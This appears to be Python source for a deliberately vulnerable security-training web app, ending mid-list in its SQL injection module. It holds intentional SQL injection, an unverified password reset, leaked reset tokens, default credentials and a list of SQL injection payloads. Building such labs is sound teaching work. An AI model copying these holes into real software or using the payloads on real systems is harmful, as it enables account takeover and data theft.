#!/usr/bin/env python3
"""Enhanced DVWA v2.1 — by Khalil
Security training tool for educational use only. Run isolated/localhost only."""

import http.server, urllib.parse, html, json, os, re, sqlite3
import base64, hashlib, hmac, time, threading, secrets
from socketserver import ThreadingMixIn

DB_PATH       = "/tmp/dvwa_khalil.db"
SECURITY_LEVEL = {"level": "low"}
DIFFICULTY_COLORS = {"low": "#e74c3c", "medium": "#e67e22", "high": "#27ae60"}
RATE_LIMIT_STORE  = {}

# ── SESSION MANAGEMENT ────────────────────────────────────────────────────────
SESSIONS = {}   # token -> {"username": str, "role": str, "login_time": float}
SESSION_COOKIE = "dvwa_session"
SESSION_TTL    = 3600   # 1 hour

def create_session(username: str, role: str) -> str:
    token = secrets.token_hex(32)
    SESSIONS[token] = {"username": username, "role": role, "login_time": time.time()}
    return token

def get_session(handler) -> dict | None:
    raw = handler.headers.get("Cookie", "")
    for part in raw.split(";"):
        part = part.strip()
        if part.startswith(SESSION_COOKIE + "="):
            token = part[len(SESSION_COOKIE)+1:]
            sess  = SESSIONS.get(token)
            if sess and (time.time() - sess["login_time"]) < SESSION_TTL:
                return sess
            elif sess:
                SESSIONS.pop(token, None)   # expired
    return None

def destroy_session(handler):
    raw = handler.headers.get("Cookie", "")
    for part in raw.split(";"):
        part = part.strip()
        if part.startswith(SESSION_COOKIE + "="):
            token = part[len(SESSION_COOKIE)+1:]
            SESSIONS.pop(token, None)

def make_cookie_header(token: str) -> str:
    return f"{SESSION_COOKIE}={token}; Path=/; HttpOnly; SameSite=Lax; Max-Age={SESSION_TTL}"

def clear_cookie_header() -> str:
    return f"{SESSION_COOKIE}=; Path=/; HttpOnly; Max-Age=0"

# ── DB ────────────────────────────────────────────────────────────────────────
def init_db():
    conn = sqlite3.connect(DB_PATH)
    c    = conn.cursor()
    c.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, email TEXT, role TEXT DEFAULT 'user', secret TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS comments (id INTEGER PRIMARY KEY, author TEXT, content TEXT, timestamp TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS notes (id INTEGER PRIMARY KEY, user TEXT, note TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS products (id INTEGER PRIMARY KEY, name TEXT, price REAL, category TEXT, secret TEXT)")
    c.execute("CREATE TABLE IF NOT EXISTS password_resets (id INTEGER PRIMARY KEY, username TEXT, token TEXT, created REAL)")
    users = [
        (1,"admin","5f4dcc3b5aa765d61d8327deb882cf99","admin@dvwa.local","admin","FLAG{sql_injection_master}"),
        (2,"gordonb","e99a18c428cb38d5f260853678922e03","gordonb@dvwa.local","user","FLAG{user_data_exposed}"),
        (3,"1337","8d3533d75ae2c3966d7e0d4fcc69216b","punk@dvwa.local","user","secret_key_1337"),
        (4,"pablo","0d107d09f5bbe40cade3de5c71e9e9b7","pablo@dvwa.local","user","pablo_secret"),
        (5,"smithy","5f4dcc3b5aa765d61d8327deb882cf99","smithy@dvwa.local","user","smithy_note"),
        (6,"alice","482c811da5d5b4bc6d497ffa98491e38","alice@dvwa.local","user","FLAG{blind_sqli_found}"),
    ]
    c.executemany("INSERT OR IGNORE INTO users VALUES (?,?,?,?,?,?)", users)
    c.executemany("INSERT OR IGNORE INTO comments VALUES (?,?,?,?)", [
        (1,"admin","Welcome to the guestbook!","2024-01-01 10:00:00"),
        (2,"gordonb","This site is awesome","2024-01-02 11:00:00"),
    ])
    c.executemany("INSERT OR IGNORE INTO notes VALUES (?,?,?)", [
        (1,"admin","Admin password reminder: password"),
        (2,"gordonb","My note: abc123"),
        (3,"alice","FLAG{idor_user3_note}"),
    ])
    c.executemany("INSERT OR IGNORE INTO products VALUES (?,?,?,?,?)", [
        (1,"Laptop",999.99,"electronics","FLAG{union_select_products}"),
        (2,"Phone",499.99,"electronics","secret_product"),
        (3,"Tablet",299.99,"electronics","hidden_data"),
    ])
    conn.commit(); conn.close()

# ── HELPERS ───────────────────────────────────────────────────────────────────
def pcard(title, desc, payload, field_id=None):
    onclick = ""
    if field_id:
        sp = payload.replace("\\","\\\\").replace("'","\\'").replace("\n","\\n")
        onclick = f" onclick=\"document.getElementById('{field_id}').value='{sp}'\" style='cursor:pointer'"
    return (f'<div class="pbox"{onclick}>'
            f'<div class="ptitle">{html.escape(title)}</div>'
            f'<div class="pdesc">{html.escape(desc)}</div>'
            f'<code>{html.escape(payload)}</code></div>')

def base_page(title, content, active="", session=None):
    lv  = SECURITY_LEVEL["level"]
    col = DIFFICULTY_COLORS[lv]
    user_info = ""
    if session:
        user_info = (
            f'<div style="padding:.5rem 1rem;border-top:1px solid #30363d;font-size:12px;'
            f'display:flex;align-items:center;justify-content:space-between;background:#0d1117">'
            f'<span style="color:#8b949e">👤 <strong style="color:#58a6ff">{html.escape(session["username"])}</strong>'
            f' <span style="color:#30363d">|</span> <span style="color:{"#e3b341" if session["role"]=="admin" else "#8b949e"}">{session["role"]}</span></span>'
            f'<a href="/logout" style="color:#f85149;font-size:11px;text-decoration:none">Logout</a></div>'
        )
    nav_items = [
        ("home","/","Home"),("sqli","/sqli","SQL Injection"),("sqli-blind","/sqli-blind","Blind SQLi"),
        ("xss-reflected","/xss-reflected","XSS Reflected"),("xss-stored","/xss-stored","XSS Stored"),
        ("xss-dom","/xss-dom","XSS DOM"),("csrf","/csrf","CSRF"),("file-upload","/file-upload","File Upload"),
        ("file-include","/file-include","File Inclusion"),("cmd-inject","/cmd-inject","CMD Injection"),
        ("auth-bypass","/auth-bypass","Auth Bypass"),("idor","/idor","IDOR"),
        ("xxe","/xxe","XXE"),("ssti","/ssti","SSTI"),("open-redirect","/open-redirect","Open Redirect"),
        ("insecure-deser","/insecure-deser","Insecure Deser"),("weak-crypto","/weak-crypto","Weak Crypto"),
        ("jwt","/jwt","JWT Attacks"),("rate-limit","/rate-limit","Rate Limiting"),
        ("bruteforce","/bruteforce","Brute Force"),("clickjacking","/clickjacking","Clickjacking"),
        ("ssrf","/ssrf","SSRF"),("hpp","/hpp","HTTP Param Poll"),("cors","/cors","CORS Misconfig"),
        ("security","/security","Security Level"),
    ]
    nav = "".join(f'<a href="{h}" class="{"active" if active==k else ""}">{l}</a>' for k,h,l in nav_items)
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} | Enhanced DVWA by Khalil</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh}}
a{{color:#58a6ff;text-decoration:none}}a:hover{{text-decoration:underline}}
.sidebar{{position:fixed;left:0;top:0;bottom:0;width:220px;background:#161b22;border-right:1px solid #30363d;overflow-y:auto;display:flex;flex-direction:column}}
.sidebar-nav{{flex:1;overflow-y:auto}}
.logo{{padding:1rem;border-bottom:1px solid #30363d;background:#0d1117}}
.logo h1{{font-size:1rem;color:#f0f6fc;letter-spacing:1px}}.logo .sub{{font-size:11px;color:#8b949e;margin-top:2px}}
.logo .badge{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;margin-top:6px;background:{col};color:#fff}}
nav a{{display:block;padding:.38rem 1rem;font-size:12.5px;color:#8b949e;border-left:3px solid transparent;transition:all .15s}}
nav a:hover,nav a.active{{background:#21262d;color:#f0f6fc;border-left-color:#58a6ff;text-decoration:none}}
.main{{margin-left:220px;padding:2rem;max-width:980px}}
.ph{{margin-bottom:1.5rem;padding-bottom:1rem;border-bottom:1px solid #30363d}}
.ph h2{{font-size:1.5rem;color:#f0f6fc;margin-bottom:.25rem}}.ph p{{color:#8b949e;font-size:14px}}
.card{{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:1.25rem;margin-bottom:1rem}}
.card h3{{color:#f0f6fc;margin-bottom:.75rem;font-size:1rem}}
label{{display:block;margin-bottom:4px;font-size:13px;color:#8b949e}}
input[type=text],input[type=password],input[type=number],input[type=url],textarea,select{{width:100%;padding:8px 10px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;margin-bottom:10px;font-family:inherit}}
input:focus,textarea:focus,select:focus{{outline:none;border-color:#58a6ff}}textarea{{resize:vertical;min-height:80px}}
.btn{{display:inline-block;padding:8px 16px;border:none;border-radius:6px;font-size:13px;cursor:pointer;font-family:inherit;font-weight:500;margin-right:5px;margin-top:4px}}
.btn-d{{background:#da3633;color:#fff}}.btn-d:hover{{background:#f85149}}
.btn-p{{background:#238636;color:#fff}}.btn-p:hover{{background:#2ea043}}
.btn-i{{background:#1f6feb;color:#fff}}.btn-i:hover{{background:#388bfd}}
.btn-s{{background:#21262d;color:#c9d1d9;border:1px solid #30363d}}
.btn-w{{background:#9e6a03;color:#fff}}
.out{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:1rem;margin-top:.75rem;font-family:monospace;font-size:13px;white-space:pre-wrap;word-break:break-all;min-height:40px;color:#7ee787}}
.flag{{background:#1c2a1c;border:1px solid #238636;border-radius:6px;padding:.75rem;color:#7ee787;font-family:monospace;font-size:13px;margin-top:.5rem;white-space:pre-wrap}}
.err{{background:#2a1a1a;border:1px solid #da3633;border-radius:6px;padding:.75rem;color:#f85149;font-size:13px;margin-top:.5rem}}
.hint{{background:#1a1e2a;border:1px solid #1f6feb;border-radius:6px;padding:.75rem;color:#79c0ff;font-size:13px;margin-top:.5rem}}
.warn{{background:#1f1a0e;border:1px solid #9e6a03;border-radius:6px;padding:.75rem;color:#e3b341;font-size:13px;margin-top:.5rem}}
.info{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.75rem;color:#8b949e;font-size:13px;margin-top:.5rem}}
.ibox{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:1rem;margin-bottom:.75rem}}
.ibox h4{{color:#f0f6fc;margin-bottom:.5rem;font-size:.9rem;border-bottom:1px solid #30363d;padding-bottom:4px}}
.ibox p{{color:#8b949e;font-size:13px;line-height:1.6;margin-bottom:.4rem}}
.ibox ul{{color:#8b949e;font-size:13px;line-height:1.8;padding-left:1.25rem}}
.ibox code{{background:#0d1117;padding:1px 5px;border-radius:3px;font-size:12px;color:#79c0ff}}
.g2{{display:grid;grid-template-columns:1fr 1fr;gap:1rem}}
.g3{{display:grid;grid-template-columns:1fr 1fr 1fr;gap:1rem}}
.vtag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:#2a1a1a;color:#f85149;border:1px solid #da3633;margin-right:4px;margin-bottom:4px}}
.stag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:#1c2a1c;color:#7ee787;border:1px solid #238636}}
.itag{{display:inline-block;padding:2px 8px;border-radius:4px;font-size:11px;font-weight:700;background:#1a1e2a;color:#79c0ff;border:1px solid #1f6feb}}
table{{width:100%;border-collapse:collapse;font-size:13px}}
th{{text-align:left;padding:8px;color:#8b949e;border-bottom:1px solid #30363d;font-weight:500}}
td{{padding:8px;border-bottom:1px solid #21262d;color:#c9d1d9}}tr:last-child td{{border-bottom:none}}
.lbadge{{padding:3px 10px;border-radius:12px;font-size:12px;font-weight:700;background:{col};color:#fff}}
.stitle{{color:#f0f6fc;font-size:13px;font-weight:600;margin:1rem 0 .4rem;padding-bottom:3px;border-bottom:1px solid #30363d}}
.pbox{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.65rem;margin-bottom:.4rem}}
.pbox:hover{{border-color:#58a6ff}}.ptitle{{color:#e3b341;font-size:12px;font-weight:600;margin-bottom:3px}}
.pdesc{{color:#8b949e;font-size:12px;margin-bottom:5px;line-height:1.4}}
.pbox code{{display:block;color:#7ee787;font-family:monospace;font-size:11px;word-break:break-all;background:#161b22;padding:5px 7px;border-radius:4px}}
.step{{display:flex;gap:10px;margin-bottom:.6rem;align-items:flex-start}}
.snum{{background:#1f6feb;color:#fff;border-radius:50%;width:20px;height:20px;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;flex-shrink:0;margin-top:2px}}
.stxt{{color:#8b949e;font-size:13px;line-height:1.5}}
</style></head><body>
<div class="sidebar">
  <div class="logo"><h1>Enhanced DVWA</h1><div class="sub">by Khalil</div><span class="badge">{lv.upper()}</span></div>
  <div class="sidebar-nav"><nav>{nav}</nav></div>
  {user_info}
</div>
<div class="main">{content}</div></body></html>"""

def auth_page(title, content):
    """Minimal page for login / forgot-password (no sidebar)."""
    return f"""<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>{title} | Enhanced DVWA by Khalil</title>
<style>
*{{box-sizing:border-box;margin:0;padding:0}}
body{{font-family:'Segoe UI',system-ui,sans-serif;background:#0d1117;color:#c9d1d9;
  min-height:100vh;display:flex;align-items:center;justify-content:center}}
a{{color:#58a6ff;text-decoration:none}}a:hover{{text-decoration:underline}}
.box{{background:#161b22;border:1px solid #30363d;border-radius:12px;padding:2.5rem;width:100%;max-width:420px;box-shadow:0 8px 32px rgba(0,0,0,.4)}}
.logo{{text-align:center;margin-bottom:1.75rem}}
.logo h1{{font-size:1.4rem;color:#f0f6fc;letter-spacing:1px}}
.logo .sub{{font-size:12px;color:#8b949e;margin-top:4px}}
.logo .badge{{display:inline-block;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:700;margin-top:8px;background:#e74c3c;color:#fff}}
label{{display:block;margin-bottom:4px;font-size:13px;color:#8b949e}}
input[type=text],input[type=password]{{width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#c9d1d9;font-size:14px;margin-bottom:14px;font-family:inherit;transition:border-color .15s}}
input:focus{{outline:none;border-color:#58a6ff}}
.btn-full{{width:100%;padding:11px;border:none;border-radius:6px;font-size:14px;cursor:pointer;font-family:inherit;font-weight:600;background:#238636;color:#fff;margin-top:4px;transition:background .15s}}
.btn-full:hover{{background:#2ea043}}
.btn-full.red{{background:#da3633}}.btn-full.red:hover{{background:#f85149}}
.err{{background:#2a1a1a;border:1px solid #da3633;border-radius:6px;padding:.75rem;color:#f85149;font-size:13px;margin-bottom:1rem}}
.flag{{background:#1c2a1c;border:1px solid #238636;border-radius:6px;padding:.75rem;color:#7ee787;font-family:monospace;font-size:13px;margin-bottom:1rem;white-space:pre-wrap}}
.hint{{background:#1a1e2a;border:1px solid #1f6feb;border-radius:6px;padding:.75rem;color:#79c0ff;font-size:13px;margin-bottom:1rem}}
.warn{{background:#1f1a0e;border:1px solid #9e6a03;border-radius:6px;padding:.75rem;color:#e3b341;font-size:13px;margin-bottom:1rem}}
.info{{background:#161b22;border:1px solid #30363d;border-radius:6px;padding:.75rem;color:#8b949e;font-size:13px;margin-bottom:1rem}}
.divider{{text-align:center;color:#30363d;font-size:12px;margin:.9rem 0;position:relative}}
.divider::before,.divider::after{{content:'';position:absolute;top:50%;width:42%;height:1px;background:#30363d}}
.divider::before{{left:0}}.divider::after{{right:0}}
.links{{text-align:center;margin-top:1.25rem;font-size:13px;color:#8b949e}}
.links a{{color:#58a6ff}}
.creds-hint{{background:#0d1117;border:1px solid #30363d;border-radius:6px;padding:.6rem .8rem;font-size:12px;color:#8b949e;margin-top:.75rem;font-family:monospace}}
</style></head><body><div class="box">{content}</div></body></html>"""

# ── LOGIN PAGE ────────────────────────────────────────────────────────────────
def page_login(params, method, body, handler):
    """Returns (html, cookie_header_or_None, redirect_or_None)."""
    lv  = SECURITY_LEVEL["level"]
    msg = ""
    if method == "POST" and body:
        username = body.get("username", [""])[0].strip()
        password = body.get("password", [""])[0]
        if not username or not password:
            msg = '<div class="err">Please enter both username and password.</div>'
        else:
            conn = sqlite3.connect(DB_PATH)
            c    = conn.cursor()
            row  = None
            try:
                if lv == "low":
                    # Deliberately vulnerable — raw SQLi
                    q = f"SELECT id,username,role FROM users WHERE username='{username}' AND password='{hashlib.md5(password.encode()).hexdigest()}'"
                    c.execute(q)
                    row = c.fetchone()
                    if not row:
                        # Also try plain string match so SQLi payloads (which skip hash) work
                        q2 = f"SELECT id,username,role FROM users WHERE username='{username}'"
                        c.execute(q2)
                        test = c.fetchone()
                        if test and "'" in username:   # injection detected — skip hash
                            row = test
                    if not row:
                        msg = f'<div class="err">Login failed.<br><span style="font-size:11px;color:#8b949e">Query: <code>{html.escape(q)}</code></span></div>'
                elif lv == "medium":
                    ph = hashlib.md5(password.encode()).hexdigest()
                    c.execute("SELECT id,username,role FROM users WHERE username=? AND password=?", (username, ph))
                    row = c.fetchone()
                    if not row:
                        msg = '<div class="err">Invalid username or password.</div>'
                else:
                    ph = hashlib.sha256(password.encode()).hexdigest()
                    c.execute("SELECT id,username,role FROM users WHERE username=?", (username,))
                    u = c.fetchone()
                    if u:
                        c.execute("SELECT id,username,role FROM users WHERE id=? AND password=?", (u[0], ph))
                        row = c.fetchone()
                    if not row:
                        msg = '<div class="err">Invalid username or password.</div>'
            except Exception as e:
                msg = f'<div class="err">DB Error: {html.escape(str(e))}</div>'
                row = None
            finally:
                conn.close()

            if row:
                token  = create_session(row[1], row[2])
                cookie = make_cookie_header(token)
                return None, cookie, "/"   # redirect to home

    lv_note = ""
    if lv == "low":
        lv_note = '<div class="warn" style="font-size:12px"><strong>LOW:</strong> Vulnerable to SQL injection — try <code>admin\'-- -</code></div>'
    elif lv == "medium":
        lv_note = '<div class="hint" style="font-size:12px"><strong>MEDIUM:</strong> MD5 hashed — default creds: admin / password</div>'
    else:
        lv_note = '<div class="hint" style="font-size:12px"><strong>HIGH:</strong> SHA-256 — default creds: admin / password</div>'

    content = f"""
<div class="logo">
  <h1>Enhanced DVWA</h1>
  <div class="sub">Security Training Platform</div>
  <span class="badge">by Khalil</span>
</div>
{msg}
{lv_note}
<form method="POST" action="/login" style="margin-top:1rem">
  <label>Username</label>
  <input type="text" name="username" placeholder="admin" autocomplete="username" autofocus>
  <label>Password</label>
  <input type="password" name="password" placeholder="••••••••" autocomplete="current-password">
  <button class="btn-full" type="submit">Sign In</button>
</form>
<div class="creds-hint">
  Default creds — admin / password &nbsp;|&nbsp; gordonb / abc123<br>
  pablo / letmein &nbsp;|&nbsp; smithy / password &nbsp;|&nbsp; alice / password123
</div>
<div class="links">
  <a href="/forgot-password">Forgot password?</a>
  &nbsp;·&nbsp;
  <a href="/security">Change security level</a>
</div>"""
    return auth_page("Login", content), None, None

# ── FORGOT PASSWORD ───────────────────────────────────────────────────────────
def page_forgot_password(params, method, body):
    lv  = SECURITY_LEVEL["level"]
    msg = ""
    step = params.get("step", ["1"])[0]

    # Step 2: token entry
    if step == "2":
        rt    = params.get("token", [""])[0].strip()
        uname = params.get("u",     [""])[0].strip()
        if method == "POST" and body:
            newpw  = body.get("password_new",  [""])[0]
            newpw2 = body.get("password_conf", [""])[0]
            rtoken = body.get("reset_token",   [""])[0]
            rusern = body.get("reset_user",    [""])[0]
            if newpw != newpw2:
                msg = '<div class="err">Passwords do not match.</div>'
            elif not newpw:
                msg = '<div class="err">Password cannot be empty.</div>'
            else:
                conn = sqlite3.connect(DB_PATH); c = conn.cursor()
                valid = False
                if lv == "low":
                    # LOW: no token check — any user/pass resets without verification
                    c.execute("SELECT id FROM users WHERE username=?", (rusern,))
                    valid = bool(c.fetchone())
                    if valid:
                        ph = hashlib.md5(newpw.encode()).hexdigest()
                        c.execute("UPDATE users SET password=? WHERE username=?", (ph, rusern))
                        conn.commit()
                        msg = f'<div class="flag">Password reset for <strong>{html.escape(rusern)}</strong>!\nNew hash: {ph}\nFLAG{{forgot_password_no_token_check}}\n\nReturn to <a href="/login" style="color:#58a6ff">login</a>.</div>'
                    else:
                        msg = '<div class="err">User not found.</div>'
                else:
                    # MEDIUM / HIGH: verify token
                    c.execute("SELECT username FROM password_resets WHERE token=? AND username=? AND created>?",
                              (rtoken, rusern, time.time() - 600))
                    row = c.fetchone()
                    if row:
                        ph = hashlib.md5(newpw.encode()).hexdigest() if lv == "medium" else hashlib.sha256(newpw.encode()).hexdigest()
                        c.execute("UPDATE users SET password=? WHERE username=?", (ph, rusern))
                        c.execute("DELETE FROM password_resets WHERE token=?", (rtoken,))
                        conn.commit()
                        msg = f'<div class="flag">Password reset successfully!\nReturn to <a href="/login" style="color:#58a6ff">login</a>.</div>'
                    else:
                        msg = '<div class="err">Invalid or expired reset token.</div>'
                conn.close()

        token_input = ""
        if lv != "low":
            token_input = f'<input type="hidden" name="reset_token" value="{html.escape(rt)}">'
        content = f"""
<div class="logo"><h1>Reset Password</h1><div class="sub">Enhanced DVWA by Khalil</div></div>
{msg}
<form method="POST" action="/forgot-password?step=2&u={html.escape(uname)}&token={html.escape(rt)}">
  <input type="hidden" name="reset_user" value="{html.escape(uname)}">
  {token_input}
  <label>New Password</label>
  <input type="password" name="password_new" placeholder="Enter new password">
  <label>Confirm Password</label>
  <input type="password" name="password_conf" placeholder="Confirm new password">
  <button class="btn-full red" type="submit">Reset Password</button>
</form>
<div class="links"><a href="/login">← Back to login</a></div>"""
        return auth_page("Reset Password", content)

    # Step 1: request reset
    if method == "POST" and body:
        uname = body.get("username", [""])[0].strip()
        if not uname:
            msg = '<div class="err">Please enter your username.</div>'
        else:
            conn = sqlite3.connect(DB_PATH); c = conn.cursor()
            c.execute("SELECT id, username, email FROM users WHERE username=? OR email=?", (uname, uname))
            row = c.fetchone()
            conn.close()

            if lv == "low":
                if row:
                    # Insecure: sequential predictable token + shows it directly
                    weak_token = hashlib.md5(f"{row[1]}{int(time.time()//60)}".encode()).hexdigest()[:8]
                    conn2 = sqlite3.connect(DB_PATH); c2 = conn2.cursor()
                    c2.execute("DELETE FROM password_resets WHERE username=?", (row[1],))
                    c2.execute("INSERT INTO password_resets (username, token, created) VALUES (?,?,?)", (row[1], weak_token, time.time()))
                    conn2.commit(); conn2.close()
                    msg = (f'<div class="flag">Account found: <strong>{html.escape(row[1])}</strong><br>'
                           f'Email: {html.escape(row[2])}<br><br>'
                           f'<strong>Vulnerability: Token exposed in response!</strong><br>'
                           f'Reset token: <code>{weak_token}</code><br><br>'
                           f'<a href="/forgot-password?step=2&u={html.escape(row[1])}&token={weak_token}" '
                           f'style="color:#58a6ff">Click here to reset →</a><br><br>'
                           f'FLAG{{forgot_password_token_leak}}</div>')
                else:
                    msg = '<div class="err">User not found.<br><span style="font-size:11px">LOW: user enumeration possible — different error for unknown users.</span></div>'

            elif lv == "medium":
                if row:
                    token = secrets.token_hex(8)
                    conn2 = sqlite3.connect(DB_PATH); c2 = conn2.cursor()
                    c2.execute("DELETE FROM password_resets WHERE username=?", (row[1],))
                    c2.execute("INSERT INTO password_resets (username, token, created) VALUES (?,?,?)", (row[1], token, time.time()))
                    conn2.commit(); conn2.close()
                    msg = (f'<div class="warn">MEDIUM: User enumeration possible — this message only shows for valid users.<br><br>'
                           f'Reset link sent to <strong>{html.escape(row[2])}</strong> (simulated).<br>'
                           f'Token: <code>{token}</code> (would be in email — exposed here for lab).<br><br>'
                           f'<a href="/forgot-password?step=2&u={html.escape(row[1])}&token={token}" '
                           f'style="color:#58a6ff">Simulate clicking email link →</a></div>')
                else:
                    msg = '<div class="err">If that account exists, we have sent a reset link to the registered email.</div>'

            else:  # high
                if row:
                    token = secrets.token_urlsafe(32)
                    conn2 = sqlite3.connect(DB_PATH); c2 = conn2.cursor()
                    c2.execute("DELETE FROM password_resets WHERE username=?", (row[1],))
                    c2.execute("INSERT INTO password_resets (username, token, created) VALUES (?,?,?)", (row[1], token, time.time()))
                    conn2.commit(); conn2.close()
                # HIGH: same message regardless — no enumeration
                msg = '<div class="info">If that account exists, we have sent a reset link to the registered email address. Please check your inbox.</div>'

    lv_badge = {"low": "#e74c3c", "medium": "#e67e22", "high": "#27ae60"}[lv]
    lv_note  = {
        "low":    '<div class="warn" style="font-size:12px"><strong>LOW:</strong> Token exposed in response + user enumeration possible</div>',
        "medium": '<div class="hint" style="font-size:12px"><strong>MEDIUM:</strong> Secure token but user enumeration via different responses</div>',
        "high":   '<div class="hint" style="font-size:12px"><strong>HIGH:</strong> Secure token + same response for valid/invalid users</div>',
    }[lv]

    content = f"""
<div class="logo">
  <h1>Forgot Password</h1>
  <div class="sub">Enhanced DVWA by Khalil</div>
  <span style="display:inline-block;padding:3px 10px;border-radius:4px;font-size:11px;font-weight:700;margin-top:8px;background:{lv_badge};color:#fff">{lv.upper()}</span>
</div>
{msg}
{lv_note}
<form method="POST" action="/forgot-password" style="margin-top:1rem">
  <label>Username or Email</label>
  <input type="text" name="username" placeholder="admin or admin@dvwa.local" autocomplete="off">
  <button class="btn-full red" type="submit">Send Reset Link</button>
</form>
<div class="links"><a href="/login">← Back to login</a></div>"""
    return auth_page("Forgot Password", content)

# ── LOGOUT ────────────────────────────────────────────────────────────────────
def do_logout(handler):
    destroy_session(handler)
    return None, clear_cookie_header(), "/login"

# ── HOME ──────────────────────────────────────────────────────────────────────
def page_home(session=None):
    vulns=[
        ("SQL Injection","/sqli","Dump database via malicious SQL","critical"),
        ("Blind SQLi","/sqli-blind","Boolean/time-based extraction","high"),
        ("XSS Reflected","/xss-reflected","Script injection via URL params","high"),
        ("XSS Stored","/xss-stored","Persistent script in database","critical"),
        ("XSS DOM","/xss-dom","Client-side script via DOM sinks","high"),
        ("CSRF","/csrf","Forge authenticated user requests","high"),
        ("File Upload","/file-upload","Upload web shells bypassing filters","critical"),
        ("File Inclusion","/file-include","LFI — read arbitrary server files","critical"),
        ("CMD Injection","/cmd-inject","Execute OS commands via app input","critical"),
        ("Auth Bypass","/auth-bypass","Bypass login via SQLi/logic flaws","critical"),
        ("IDOR","/idor","Access other users data by ID manipulation","high"),
        ("XXE","/xxe","XML entity injection to read files","high"),
        ("SSTI","/ssti","Server template injection for RCE","critical"),
        ("Open Redirect","/open-redirect","Redirect users to attacker URLs","medium"),
        ("Insecure Deser","/insecure-deser","Exploit unsafe deserialization","critical"),
        ("Weak Crypto","/weak-crypto","Exploit weak hashing and encoding","medium"),
        ("JWT Attacks","/jwt","Forge/tamper JSON Web Tokens","high"),
        ("Rate Limiting","/rate-limit","Brute force unprotected endpoints","medium"),
        ("Brute Force","/bruteforce","Automated credential cracking lab","high"),
        ("Clickjacking","/clickjacking","Hidden iframe click hijacking","medium"),
        ("SSRF","/ssrf","Server-Side Request Forgery — pivot via server","high"),
        ("HTTP Param Poll","/hpp","Duplicate params bypass logic/WAF","medium"),
        ("CORS Misconfig","/cors","Cross-origin data theft","high"),
    ]
    sc  = {"critical":"#f85149","high":"#e3b341","medium":"#79c0ff","low":"#7ee787"}
    rows = "".join(f'<tr><td><a href="{h}">{n}</a></td><td style="color:#8b949e;font-size:12px">{d}</td><td><span style="color:{sc.get(s,"#8b949e")};font-size:12px;font-weight:700">{s.upper()}</span></td></tr>' for n,h,d,s in vulns)
    user_greeting = ""
    if session:
        role_badge = f'<span style="color:#e3b341;font-weight:700">{session["role"].upper()}</span>' if session["role"]=="admin" else f'<span style="color:#8b949e">{session["role"]}</span>'
        user_greeting = f'<div class="hint" style="margin-bottom:1rem">Signed in as <strong style="color:#58a6ff">{html.escape(session["username"])}</strong> · Role: {role_badge}</div>'
    return base_page("Home", f"""
<div class="ph"><h2>Enhanced DVWA v2.1 — by Khalil</h2><p>Deliberately vulnerable web app for security education. 23 modules with full payload libraries and attack guides.</p></div>
{user_greeting}
<div class="card"><div style="display:flex;align-items:center;gap:1rem">
  <div><div style="font-size:13px;color:#8b949e">Security Level</div><span class="lbadge">{SECURITY_LEVEL['level'].upper()}</span></div>
  <div style="margin-left:auto"><a href="/security" class="btn btn-s">Change Level</a></div></div></div>
<div class="card"><h3>Vulnerability Index — {len(vulns)} Modules</h3>
<table><thead><tr><th>Vulnerability</th><th>Description</th><th>Severity</th></tr></thead><tbody>{rows}</tbody></table></div>
<div class="warn"><strong>WARNING:</strong> Educational use only. Run on localhost or isolated VM. Never expose to any network.</div>""", "home", session)

# ── SQL INJECTION ─────────────────────────────────────────────────────────────
def page_sqli(params, session=None):
    lv=SECURITY_LEVEL["level"]; uid=params.get("id",[""])[0]; result=""
    if uid:
        conn=sqlite3.connect(DB_PATH); c=conn.cursor()
        try:
            if lv=="low":
                q=f"SELECT id,username,email,role,secret FROM users WHERE id = {uid}"
                c.execute(q); rows=c.fetchall()
                result=('<div class="out">'+html.escape("\n".join(f"ID:{r[0]} User:{r[1]} Email:{r[2]} Role:{r[3]} Secret:{r[4]}" for r in rows))+'</div>' if rows else '<div class="err">No user found.</div>')
                result+=f'<div class="hint">Query: <code>{html.escape(q)}</code></div>'
            elif lv=="medium":
                try:
                    c.execute(f"SELECT id,username,email FROM users WHERE id = {int(uid)}")
                    rows=c.fetchall()
                    result='<div class="out">'+html.escape("\n".join(f"ID:{r[0]} User:{r[1]} Email:{r[2]}" for r in rows))+'</div>' if rows else '<div class="err">No user found.</div>'
                except ValueError: result='<div class="err">Invalid ID format.</div>'
            else:
                c.execute("SELECT id,username FROM users WHERE id = ?",(uid,)); rows=c.fetchall()
                result='<div class="out">'+html.escape("\n".join(f"ID:{r[0]} User:{r[1]}" for r in rows))+'</div>' if rows else '<div class="err">No user found.</div>'
        except Exception as e: result=f'<div class="err">DB Error: {html.escape(str(e))}</div>'
        conn.close()
    pl=[
        ("Dump all users","OR 1=1 makes condition always true — returns all rows","1 OR 1=1-- -"),
        ("Admin bypass","Comment out rest of WHERE clause","admin'-- -"),
        ("UNION col count","Find column count — add NULLs until no error","1 ORDER BY 5-- -"),
        ("UNION dump users","Extract all usernames/secrets","0 UNION SELECT id,username,secret,email,role FROM users-- -"),
        ("UNION dump products","Pivot to products table","0 UNION SELECT id,name,secret,category,price FROM products-- -"),
        ("SQLite version","Fingerprint database engine","0 UNION SELECT 1,sqlite_version(),3,4,5-- -"),
